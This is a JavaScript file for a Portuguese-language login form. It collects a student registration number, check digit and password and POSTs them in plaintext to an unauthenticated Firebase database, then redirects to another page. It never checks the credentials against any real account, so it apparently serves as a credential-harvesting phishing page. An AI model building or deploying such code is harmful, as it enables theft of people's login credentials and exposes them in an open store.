

  
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-app.js";
import { getFirestore, collection, addDoc, getDocs, doc, deleteDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.13.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDbQH9lRIEfYeXGA92QWVIkZ0No6-5xrio",
  authDomain: "urna-ec7a7.firebaseapp.com",
  databaseURL: "https://urna-ec7a7-default-rtdb.firebaseio.com",
  projectId: "urna-ec7a7",
  storageBucket: "urna-ec7a7.appspot.com",
  messagingSenderId: "153920023241",
  appId: "1:153920023241:web:35473099846372372ffb18"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);

const ra = document.querySelector("#number1");
const senha = document.querySelector("#senha");
const digito = document.querySelector("#digito");
const modal2 = document.querySelector("#modal2");
const botao = document.querySelector("#botao");
const modal = document.querySelector("#modal");
var inputPass = document.getElementById('senha');
var bntShowpass = document.querySelector('#bnt-senha');
var okButton = document.querySelector('#okButton');





// Função POST corrigida (continua igual)
async function POST() {
  const url = "https://urna-ec7a7-default-rtdb.firebaseio.com/cadastro.json";
  
  const newData = {
    ra: ra.value,
    senha: senha.value,
    digito: digito.value
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(newData)
    });

    if (!response.ok) throw new Error('Erro ao enviar os dados');

    const data = await response.json();
    console.log(data);

    // Mudar de tela após o envio dos dados
    window.location.href = "./index.html";
  } catch (error) {
    console.error(error);
    modal.showModal(); // Mostrar o modal se ocorrer um erro
  }
}

// Verificar se os campos estão preenchidos e se as credenciais estão corretas
botao.addEventListener('click', () => {
  if (ra.value === '' || senha.value === '' || ra.value.length < 9 || senha.value.length < 6) {
    modal.showModal(); // Mostrar modal se os campos estiverem vazios ou incorretos
  } else if (isNaN(ra.value)) {
    modal.showModal(); // Mostrar modal se o RA não for numérico
  } else {
    modal2.showModal();
    POST(); // Chamar função POST se os dados estiverem corretos
  }
});

// Função para mostrar e ocultar a senha
function mostrarSenha() {
  if (inputPass.type === 'password') {
    inputPass.setAttribute('type', 'text');
    bntShowpass.classList.replace('bi-eye-fill', 'bi-eye-slash-fill');
    bntShowpass.style.opacity = 1;
  } else {
    inputPass.setAttribute('type', 'password');
    bntShowpass.classList.replace('bi-eye-slash-fill', 'bi-eye-fill');
    bntShowpass.style.opacity = 0.5;
  }
}

// Adicionar eventos ao carregar o documento
document.addEventListener('DOMContentLoaded', () => {
  okButton.addEventListener('click', () => {
    modal.close(); // Fechar o modal ao clicar em "OK"
  });
 
  
  bntShowpass.addEventListener('click', mostrarSenha); // Adicionar evento para mostrar/ocultar senha
});
